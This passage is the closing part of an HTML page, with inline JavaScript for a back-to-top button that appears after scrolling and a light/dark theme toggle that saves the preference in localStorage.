    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
